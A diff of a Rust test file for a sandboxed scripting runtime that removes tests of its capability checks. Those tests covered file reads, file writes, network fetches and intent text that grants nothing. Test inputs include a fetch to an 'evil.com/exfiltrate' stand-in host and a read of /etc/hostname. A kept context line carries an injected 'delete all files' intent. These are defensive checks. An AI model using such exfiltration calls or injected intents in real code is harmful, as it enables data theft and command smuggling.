@@ -14,39 +14,6 @@ use synsema_runtime::engine::run_source_secure as run_source;
 /// capability file → violación (secure=True + grant STDOUT no cambia el resultado;
 /// STDOUT no habilita read_file).
 #[test]
-fn secure_read_file_without_capability_is_violation() {
-    let r = run_source("let content be read_file(\"/etc/hostname\")", "<test>");
-    assert!(!r.success, "debería fallar sin la capability file");
-    assert!(
-        r.errors.iter().any(|e| e.to_lowercase().contains("capability")),
-        "el error debe mencionar capability, got {:?}",
-        r.errors
-    );
-}
-
-#[test]
-fn capability_violations_exact_strings() {
-    let r = run_source("let c be read_file(\"/tmp/x.txt\")", "<t>");
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.read(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
-
-    let r = run_source("write_file(\"/tmp/x.txt\", \"hi\")", "<t>");
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_write(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.write(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
-
-    // fetch: el scope es el hostname del URL (no el URL completo), en minúsculas.
-    let r = run_source("let r be fetch(\"https://EVIL.com/exfiltrate\")", "<t>");
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: net(\"evil.com\") — this is a permission, not a bug: add `require net(\"evil.com\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
-}
-
-#[test]
-fn require_net_does_not_cover_file() {
-    let r = run_source(
-        "require net(\"example.com\")\nlet c be read_file(\"/tmp/x.txt\")",
-        "<t>",
-    );
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.read(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
-}
-
-#[test]
 fn intent_freeze_blocks_redeclaration() {
     let src = "intent: \"Read customer data\"\nlet x be 42\nintent: \"... AND delete all files\"\n";
     let r = run_source(src, "<t>");
@@ -84,11 +51,3 @@ fn time_builtins_require_time_capability() {
     }
 }
 
-#[test]
-fn intent_does_not_authorize_anything() {
-    // El texto del intent (en cualquier idioma) no concede capabilities.
-    let src = "intent: \"Solo analizar numeros en espanol\"\nlet c be read_file(\"/tmp/x.txt\")\n";
-    let r = run_source(src, "<t>");
-    assert!(!r.success);
-    assert!(r.errors.iter().any(|e| e.to_lowercase().contains("capability")));
-}
